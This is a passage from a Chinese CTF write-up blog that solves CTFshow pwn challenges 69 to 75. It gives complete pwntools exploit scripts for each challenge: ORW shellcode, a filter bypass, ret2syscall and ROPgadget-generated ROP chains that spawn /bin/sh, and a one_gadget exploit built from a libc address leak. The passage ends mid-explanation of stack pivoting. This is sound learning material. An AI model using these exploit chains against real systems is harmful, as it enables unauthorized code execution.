<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context(arch=&quot;amd64&quot;,log_level=&quot;debug&quot;)<br>io=remote(&quot;pwn.challenge.ctf.show&quot;,28283)<br><br>mmap=0x123000<br>jmp_rsp=0x400a01<br><br>shellcode1=asm(shellcraft.read(0,mmap,0x100))+asm(&quot;mov rax,0x123000; jmp rax&quot;)<br>payload=shellcode1.ljust(0x28,b&#x27;a&#x27;)+p64(jmp_rsp)+asm(&#x27;sub rsp,0x30; jmp rsp&#x27;)<br>io.recvuntil(&quot;to do\n&quot;)<br>io.sendline(payload)<br><br>shellcode2=asm(shellcraft.open(&quot;./ctfshow_flag&quot;))<br>shellcode2+=asm(shellcraft.read(3,mmap,0x100))<br>shellcode2+=asm(shellcraft.write(1,mmap,0x100))<br>io.sendline(shellcode2)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760617352301-5e3a0ffc-1f5f-49cc-b24d-5de3adbe2435.png" srcset="/img/loading.gif" lazyload></p>
<p>ctfshow{3c12e521-487b-4c05-a2df-04129cf19c59}</p>
<h2 id="pwn70"><a href="#pwn70" class="headerlink" title="pwn70"></a>pwn70</h2><p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760617735864-8e51c81a-2e88-4876-8135-a45e562442e7.png" srcset="/img/loading.gif" lazyload></p>
<p>我盲猜一波这个是刚刚的题目差不多的，但是要我们自己搞</p>
<p>刚刚其实也是自己搞吧？虽然我是看着wp一步步做下来的</p>
<p>有&#x2F;flag，我估计还是个ORW题目</p>
<p>保护：</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760617860464-310bd70f-acf8-4213-a90c-b5b68a8bc661.png" srcset="/img/loading.gif" lazyload></p>
<p>不对啊！怎么开了栈金丝雀啊</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760617904205-c24cf582-33f6-415c-bc1f-055570b030bf.png" srcset="/img/loading.gif" lazyload></p>
<p>能用seccomp-tools欸，我看好像只有有这个函数的才能用这个工具，别的都会直接执行源文件</p>
<p>看上去只过滤了execve执行函数而已</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760675844517-cd874683-c1b8-4fec-8d8e-153036509842.png" srcset="/img/loading.gif" lazyload></p>
<p>主函数不让反编译啊，大致看看，这边有个is_printable函数</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760687898467-7cffe923-f966-468a-8fb0-e2ca29a99228.png" srcset="/img/loading.gif" lazyload></p>
<p>这是可以反编译的</p>
<p>进去可以看到这边只允许可打印字符通过</p>
<p>有点像pwn66那道题</p>
<p>这边的for函数也是以strlen作为循环次数评判的</p>
<p>所以我们完全可以以”\x00”来开头然后直接避开其检测</p>
<p>看见\x00，strlen就以为自己统计完了，然后这个for循环就贼短就直接没了</p>
<p>好那后边我们直接连上shellcode就是了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context(arch=&quot;amd64&quot;,log_level=&quot;debug&quot;)<br>io=remote(&quot;pwn.challenge.ctf.show&quot;,28226)<br><br>shellcode=asm(shellcraft.cat(&quot;/flag&quot;))<br>payload=b&quot;\x00B\x00&quot;+shellcode<br>io.recvuntil(&quot; name:\n&quot;)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760688320335-f3a3f1d8-e008-4547-8aca-a043423b1269.png" srcset="/img/loading.gif" lazyload></p>
<p>ctfshow{8850bdf7-bf00-43f4-8be2-9fc309a2175d}</p>
<h2 id="pwn71"><a href="#pwn71" class="headerlink" title="pwn71"></a>pwn71</h2><p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760688419935-c4b691ca-6624-4772-9372-3083987e1513.png" srcset="/img/loading.gif" lazyload></p>
<p>保护：</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760688710880-86a071bf-516a-410f-9da6-0770797107e5.png" srcset="/img/loading.gif" lazyload></p>
<p>开了NX，但是是静态环境，ret2syscall的一大特点</p>
<p>好了，这一题都是新知识了，什么是ret2syscall</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760690542990-c01bf777-4835-494b-88c1-b81aa782ab01.png" srcset="/img/loading.gif" lazyload></p>
<p>噢原来ret2系列都是主要执行system(“&#x2F;bin&#x2F;sh”)来提权</p>
<p>但是不同程序情况不一样</p>
<p><font style="color:rgb(51, 51, 51);">ret2syscall属于程序中不存在system(“&#x2F;bin&#x2F;sh&#x2F;“)的代码段，不存在合适的可执行段进行恶意代码的执行，</font><strong><font style="color:rgb(51, 51, 51);">但是程序是静态链接，且程序中中存在代码片段，拼接可组成系统调用的情况</font></strong></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760690556712-3dcce765-6abe-4f76-b2c0-82c758ccb2b9.png" srcset="/img/loading.gif" lazyload></p>
<p>这边是最简单的最低程度的知识理解程度，说的比较浅，知识告诉你当你把系统调用号eax写入0xb，然后第一个参数ebx指向&#x2F;bin&#x2F;sh，ecx和edx都是0，这个时候执行int 0x80这个发射按钮，就能执行系统调用</p>
<p>有点太浅了，为什么能这样子做到呢？</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760691881821-16e91d76-639e-4b07-802f-a3c0959efb49.png" srcset="/img/loading.gif" lazyload></p>
<p>主要还是由于syscall这个函数系统调用的特性，就是我们的Linux在x86上的系统调用通过的就是这个int 0x80执行的，当执行int 0x80时，就会调用系统，但哪个呢？就要通过系统调用号来区分入口函数</p>
<p>所以我们需要把系统调用号存入EAX，然后把函数的参数延后全部输完，最后int 0x80</p>
<p>*冷知识：execve的系统调用号就是0xb</p>
<p>大概就是这样子的意思吧</p>
<p>好了知道的差不多了，我们就是要把4个寄存器都合我心意填完就是了</p>
<p>先看看我们程序的四个寄存器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">ROPgadget --binary ./pwn71 --only &quot;pop|ret&quot;|grep eax<br>ROPgadget --binary ./pwn71 --only &quot;pop|ret&quot;|grep ebx<br></code></pre></td></tr></table></figure>

<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760692580606-82388ef0-d2de-44a7-8297-ad520d8c2192.png" srcset="/img/loading.gif" lazyload></p>
<p>大概就是这个命令</p>
<p>eax&#x3D;0x80bb196</p>
<p>然后后边继续</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760692683340-0989c6d6-0e55-4e4c-a072-c406bb73b346.png" srcset="/img/loading.gif" lazyload></p>
<p>欸都在这边了</p>
<p>ebx_ecx_edx&#x3D;0x806eb90</p>
<p>ebx是用来传参的，后边跟着的就是接下来要传进去的ecx和edx</p>
<p>ebx里边传&#x2F;bin&#x2F;sh，然后剩下的ecx和edx里边要传入0</p>
<p>这边找一下有没有&#x2F;bin&#x2F;sh</p>
<p>ROPgadget –binary “pwn71” –string”&#x2F;bin&#x2F;sh”</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760861148981-2fe4b573-c2db-4149-a743-092d5981a2ff.png" srcset="/img/loading.gif" lazyload></p>
<p>有的嗷，在0x080be408</p>
<p>好了，我们知道最后要传什么到哪里了</p>
<p>先溢出，然后构造好几个寄存器，最后int 0x80就行</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760861253850-02d3a0f5-3294-4883-b104-6b00787ed479.png" srcset="/img/loading.gif" lazyload></p>
<p>int 0x80也是现成的，就在0x08049421这边</p>
<p>好现在都齐了，找一下偏移量</p>
<p>这边我们参照pwn60的找偏移量方法，直接看看不见</p>
<blockquote>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760861473210-cc37a8dd-757d-48e1-bf35-97281c13abcc.png" srcset="/img/loading.gif" lazyload></p>
</blockquote>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760861691579-5e69dcff-12bb-4baa-8cb6-631305915c47.png" srcset="/img/loading.gif" lazyload></p>
<p>步骤一样的，可以看到偏移量为112</p>
<p>OK齐了，写代码，注意这边传给那个三个参数的时候由于栈的结构特性需要反着先写第三个，然后再是第二个第一个（主要这寄存器也是反着来的啊，所以写成edx_ecx_ebx或许会更好）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context(arch=&quot;i386&quot;,log_level=&quot;debug&quot;)<br>io=remote(&quot;pwn.challenge.ctf.show&quot;, 28311)<br><br>eax=0x80bb196<br>ebx_ecx_edx=0x806eb90<br>bin_sh=0x080be408<br>int_0x80=0x08049421<br>padding=112<br><br>payload=b&quot;a&quot;*padding+p32(eax)+p32(0xb)+p32(ebx_ecx_edx)+p32(0)+p32(0)+p32(bin_sh)+p32(int_0x80)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760862396742-3432209d-a224-41dd-bed9-4d531defde80.png" srcset="/img/loading.gif" lazyload></p>
<p>ctfshow{b68cd853-b6f7-49c7-8c85-e7bd7b8ce7ef}</p>
<h2 id="pwn72"><a href="#pwn72" class="headerlink" title="pwn72"></a>pwn72</h2><p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760862381552-007c52dd-a95e-4727-abc5-d61cb95b28c5.png" srcset="/img/loading.gif" lazyload></p>
<p>保护：</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760862459025-ece8a711-ad8c-438a-85af-a8fcc8fc5d48.png" srcset="/img/loading.gif" lazyload></p>
<p>依旧是ret2syscall，只开了NX然后是静态的</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760862561540-a1aae075-74b1-4ba7-949e-b51ad77235e4.png" srcset="/img/loading.gif" lazyload></p>
<p>这题似乎是删去了&#x2F;bin&#x2F;sh的内容，也就是说这东西要我们自己找了</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760862633292-f6f939ec-7b6b-4119-8956-1baf232a85f8.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760862669214-00987373-6f5b-473c-8862-e28bfa17d315.png" srcset="/img/loading.gif" lazyload></p>
<p>这边可以看到eax和ebx都在</p>
<p>eax&#x3D;0x080bb2c6</p>
<p>edx_ecx_ebx&#x3D;0x0806ecb0</p>
<blockquote>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760862771661-ffbec27d-155f-4844-84b7-610fe342b237.png" srcset="/img/loading.gif" lazyload></p>
<p>int 0x80也还在</p>
<p>int_0x80&#x3D;0x08049421</p>
</blockquote>
<p>这边的int 0x80还不能直接这样子搜，这个不对</p>
<p>要去ida-&gt;search-&gt;sequence of bytes来查找80CD的方式找到不同地址的int 80</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760863523993-70d32a0f-c7e8-4ef0-922d-71297e261171.png" srcset="/img/loading.gif" lazyload></p>
<p>搜索结果如上图</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760864046819-56c1dd68-a694-408d-8b3d-2f4b7d91b505.png" srcset="/img/loading.gif" lazyload></p>
<p>这边首先要确定看Instruction栏，看看是不是真正的int 0x80，而非拿来比较的80CD</p>
<p>然后是看Function，确定用途</p>
<p>这边可以看到有个直接就是sysinfo的，直接启用系统调用了 ，所以我们选用的是这一个</p>
<p>int_0x80&#x3D;0x0806f350</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760862989127-15bd1361-c17e-4e8f-b8ae-e29514ae9cc6.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760862909365-73f7e263-51a9-4fce-9b7b-e6d09ada57ed.png" srcset="/img/loading.gif" lazyload></p>
<p>按照上题同样做法，很容易确定我们的偏移量为44，直接cyclic就找到了</p>
<p>所以我们现在只缺了&#x2F;bin&#x2F;sh字符串的内容</p>
<p>只要找到即可</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760863194386-3b106f3e-16a9-453c-be83-7cdf380b82b0.png" srcset="/img/loading.gif" lazyload></p>
<p>这边考虑在bss利用read函数写入</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760863426448-20fada71-43d6-4e97-b7c9-41636fb7994e.png" srcset="/img/loading.gif" lazyload></p>
<p>bss字段可写可读</p>
<p>bss_addr&#x3D;0x080EAF80</p>
<p>我们可以一开始先利用一次ret2syscall来调用read(0, bss_addr,0x10)</p>
<p>eax写上系统调用号，在32位里read函数是0x3</p>
<p>这边确实是要确定一下32位和64位的差别</p>
<p>后边再调用一次</p>
<p>等于拼拼图构造了俩函数</p>
<p>read(0,bss_addr,0x10)</p>
<p>execve(bss_addr,0,0)</p>
<p>所以我们构造完payload之后sendline过去，然后要再sendline一个bss内部的内容，也就是b’&#x2F;bin&#x2F;sh\x00’最后写个终止符，保证其写到这边就结束</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context(arch=&quot;i386&quot;,log_level=&quot;debug&quot;)<br>io=remote(&quot;pwn.challenge.ctf.show&quot;, 28262)<br><br>eax=0x080bb2c6<br>edx_ecx_ebx=0x0806ecb0<br>int_0x80=0x0806f350<br>bss_addr=0x080EAF80<br><br>payload=b&quot;a&quot;*44+p32(eax)+p32(0x3)+p32(edx_ecx_ebx)+p32(0x10)+p32(bss_addr)+p32(0)+p32(int_0x80)<br>payload+=p32(eax)+p32(0xb)+p32(edx_ecx_ebx)+p32(0)+p32(0)+p32(bss_addr)+p32(int_0x80)<br><br>io.sendline(payload)<br>io.sendline(b&#x27;/bin/sh\x00&#x27;)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760865428187-3e2e10fd-435c-447c-a985-094e90618a0f.png" srcset="/img/loading.gif" lazyload></p>
<p>ctfshow{5d2ddcb8-d403-43d9-9708-566ff9160f58}</p>
<h2 id="pwn73"><a href="#pwn73" class="headerlink" title="pwn73"></a>pwn73</h2><p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760865489378-8c7e65fc-fd2f-4ea2-ab4e-1f90e7ddb7ad.png" srcset="/img/loading.gif" lazyload></p>
<p>？还有福利题的吗</p>
<p>保护：</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760865685352-407fe3df-788a-49fc-98ef-c8fe5744b4b1.png" srcset="/img/loading.gif" lazyload></p>
<p>还是NX静态，有点像还是ret2syscall</p>
<p>但是这边让我们用一把梭，可以注意到这种开了NX然后静态链接的题目的确是很适合直接用ROPgadget一把梭</p>
<p>我们很容易在主函数的show函数中找到栈溢出的点</p>
<p>ROPgadget –binary pwn73 –ropchain</p>
<p>直接让ROPgadget帮我们搞出来</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760866224997-05e65347-7a9a-4747-b017-3a01942365ee.png" srcset="/img/loading.gif" lazyload></p>
<p>其实我感觉基础的ret2syscall就是都可以直接拿来ropgadget一把梭的</p>
<p>两者的要求几乎差不多</p>
<p>但是ropgadget应该只能做一点最基础的</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760866527599-c2c709d8-94f2-4e26-98ca-d0ac2479c9bd.png" srcset="/img/loading.gif" lazyload></p>
<p>直接就出来了</p>
<p>溢出要我们自己写一下</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760866618638-7b34e78e-8cdd-4614-a56e-2a1a7014a3f1.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760866626607-93e51e7c-4488-4a98-b97c-fc54b93c7c11.png" srcset="/img/loading.gif" lazyload></p>
<p>0x18+4</p>
<p>可能是python或者pwntools版本的问题，ropgadget生成的pack无法正常运行，我们简单替换为p32()即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs plain">from struct import pack<br>from pwn import *<br>context(arch=&quot;i386&quot;,log_level=&quot;debug&quot;)<br>io=remote(&quot;pwn.challenge.ctf.show&quot;,28231)<br>padding=0x18+4<br><br># Padding goes here<br>p = b&#x27;a&#x27;*padding<br>p += p32(0x0806f02a) # pop edx ; ret<br>p += p32(0x080ea060) # @ .data<br>p += p32(0x080b81c6) # pop eax ; ret<br>p += b&#x27;/bin&#x27;<br>p += p32(0x080549db) # mov dword ptr [edx], eax ; ret<br>p += p32(0x0806f02a) # pop edx ; ret<br>p += p32(0x080ea064) # @ .data + 4<br>p += p32(0x080b81c6) # pop eax ; ret<br>p += b&#x27;//sh&#x27;<br>p += p32(0x080549db) # mov dword ptr [edx], eax ; ret<br>p += p32(0x0806f02a) # pop edx ; ret<br>p += p32(0x080ea068) # @ .data + 8<br>p += p32(0x08049303) # xor eax, eax ; ret<br>p += p32(0x080549db) # mov dword ptr [edx], eax ; ret<br>p += p32(0x080481c9) # pop ebx ; ret<br>p += p32(0x080ea060) # @ .data<br>p += p32(0x080de955) # pop ecx ; ret<br>p += p32(0x080ea068) # @ .data + 8<br>p += p32(0x0806f02a) # pop edx ; ret<br>p += p32(0x080ea068) # @ .data + 8<br>p += p32(0x08049303) # xor eax, eax ; ret<br>p += p32(0x0807a86f) # inc eax ; ret<br>p += p32(0x0807a86f) # inc eax ; ret<br>p += p32(0x0807a86f) # inc eax ; ret<br>p += p32(0x0807a86f) # inc eax ; ret<br>p += p32(0x0807a86f) # inc eax ; ret<br>p += p32(0x0807a86f) # inc eax ; ret<br>p += p32(0x0807a86f) # inc eax ; ret<br>p += p32(0x0807a86f) # inc eax ; ret<br>p += p32(0x0807a86f) # inc eax ; ret<br>p += p32(0x0807a86f) # inc eax ; ret<br>p += p32(0x0807a86f) # inc eax ; ret<br>p += p32(0x0806cc25) # int 0x80<br><br>payload=p<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760867082578-66931c22-ab29-4b87-b2f7-6446d54fe833.png" srcset="/img/loading.gif" lazyload></p>
<p>ctfshow{9cf31bb0-b980-4fac-8391-af96c03e33e1}</p>
<h2 id="pwn74"><a href="#pwn74" class="headerlink" title="pwn74"></a>pwn74</h2><p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760867128740-2b87dfd6-1c5c-4682-a173-44b70c37e96e.png" srcset="/img/loading.gif" lazyload></p>
<p>保护：</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760867173925-d194c6c2-d59f-4582-93ae-165cba2888fb.png" srcset="/img/loading.gif" lazyload></p>
<p>我超，全开动态</p>
<p>这边主要感觉是教学什么是one_gadget的</p>
<p>搜一下吧先</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760867629701-48a97cfa-42dc-43e0-a140-672a1877f7c8.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760867640707-340e494b-823d-414a-aee0-af29842bead3.png" srcset="/img/loading.gif" lazyload></p>
<p>这就是个直接在libc里搜索可以直接拿来提权的代码片段的工具，这些代码片段只要满足特定条件就能直接拿来得到shell，算是刚刚一把梭的麻烦一点版本</p>
<p><u>当存在libc泄露，知道libc版本的时候，我们就可以利用one_gadget来快速控制指令寄存器开启shell。这种不用像ret2libc那样去逐个构造寄存器的值来实现系统调用，而是拿libc中现成的函数，直接用。</u></p>
<p>所以我们要先知道libc版本，然后去找到其得到shell需要满足的条件</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760870120873-d84e77d0-b6fd-4aaa-a559-f3d78f35299f.png" srcset="/img/loading.gif" lazyload></p>
<p>这边可以看到我们的puts是从6C0开始的</p>
<p>我们利用网站先找找这玩意的libc版本是多少</p>
<p><a target="_blank" rel="noopener" href="https://libc.blukat.me/">libc搜索链接</a></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760870273735-9f6c4b61-395a-4632-bc67-690cdbe22930.png" srcset="/img/loading.gif" lazyload></p>
<p>当然也可以直接ldd pwn74，可以发现是使用的<code>libc.so.6</code> ，对应本地文件的位置<code>/lib/x86_64-linux-gnu/libc.so.6</code></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760870425881-74080f43-945f-45d3-ad79-e4996455d080.png" srcset="/img/loading.gif" lazyload></p>
<p>所以这边我们利用one_gadget看看需要满足的条件</p>
<p>one_gadget &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760870549815-45744697-2e4f-44dd-b033-b8136b72fff3.png" srcset="/img/loading.gif" lazyload></p>
<p>这里constraints里面就是我们要使用这个gadget需要满足的条件</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760871933126-582a1d3c-851c-4b30-9657-e78daba99add.png" srcset="/img/loading.gif" lazyload></p>
<p>我们可以先gdb动调，给main函数打断点之后r过去</p>
<p>然后用x&#x2F;s来看看这个地方是不是NULL</p>
<p>这边可以看到我们的第三个情况是对的</p>
<p>one_gadget&#x3D;0x10a2fc</p>
<p>当然我们也可以一个个尝试，不行就换，不过感觉有点蠢</p>
<p>然后就能找到真正的execve地址，这个是偏移地址，是需要加上我们基地址变成真实地址才行的</p>
<p>所以我们这边需要先泄露出libc基址</p>
<p>我们放到ida先</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760870717501-ab360205-c7ac-434d-984e-edbf3f000792.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760870721862-11b29dd9-3db0-4ee4-a076-ddabd490205a.png" srcset="/img/loading.gif" lazyload></p>
<p>在ida里可以看到我们这边直接printf出了printf的真实地址，直接泄露出来了</p>
<p>我们只需截取就能得到其真实地址，之后再去减掉其偏移地址就能得到基地址了</p>
<p>所以先截取print_addr&#x3D;int(io.recvuntil(“ “),16)</p>
<p>如此一来</p>
<p>libc&#x3D;ELF(“&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6”)</p>
<p>libc_base&#x3D;print_addr-libc.symbols[‘printf’]</p>
<p>我们也就得到了基地址</p>
<p>所以我们可以在这边编写代码</p>
<p>注意前边截取完调成int，然后后边send前再调成str</p>
<p>否则前边加减不了，后边传输不了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context(arch=&quot;amd64&quot;,log_level=&quot;debug&quot;)<br>io=remote(&quot;pwn.challenge.ctf.show&quot;,28126)<br>libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)<br><br>io.recvuntil(&quot;this:&quot;)<br>print_addr=int(io.recv(14),16)<br>libc_base=print_addr-libc.symbols[&#x27;printf&#x27;]<br><br>one_gadget=0x10a2fc<br>one_gadget_final=libc_base+one_gadget<br><br>io.recvuntil(&quot;?\n&quot;)<br>io.sendline(str(one_gadget_final))<br><br>io.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760872547151-7eb38906-c554-4009-9f36-f073be386137.png" srcset="/img/loading.gif" lazyload></p>
<p>ctfshow{45c18652-bd54-4748-8b48-ad96e2dae207}</p>
<h2 id="pwn75"><a href="#pwn75" class="headerlink" title="pwn75"></a>pwn75</h2><p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760872769178-543ae3b2-d4fe-4e6f-8387-800669238d8c.png" srcset="/img/loading.gif" lazyload></p>
<p>保护：</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760872941765-85661704-e0d1-4002-969b-e05af6b15051.png" srcset="/img/loading.gif" lazyload></p>
<p>开了NX的动态32位pwn</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760872989166-558ddd61-ed73-4c76-a069-cf56617d4f4b.png" srcset="/img/loading.gif" lazyload></p>
<p>这边可以看到栈溢出的部分限制输入0x30，然而溢出需要0x28+4</p>
<p>也就是说，溢出部分后我们只能写4个字符</p>
<p>这其实是很多比赛都在考的一部分，很多比赛都故意把栈搞的很小，一部分是限制输入的shellcode长度，而另一部分我想或许就是本题涉及的知识点——栈迁移</p>
<p>在开始本题前依旧是喜闻乐见的知识点思考环节，这边放一下何神强推的文章，<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39529207/article/details/123005057">链接</a></p>
<p>甚至为我们再次叙述了栈溢出的本质，说的确实很好</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760873167739-ddb3ec7e-d6ff-427c-a6b0-bce50005ae3a.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761180493694-1ea2aadc-9544-4f4d-a54f-8eb61ce2cc1c.png" srcset="/img/loading.gif" lazyload></p>
<p>所以若是遇到了栈太小的情况，即栈已经没有我们的容身之处，我们就只能迁移开来，去别的地方进行操作</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1761181387621-7ff8a7a6-d4a9-4df8-a570-93507f8cc457.png" srcset="/img/loading.gif" lazyload></p>
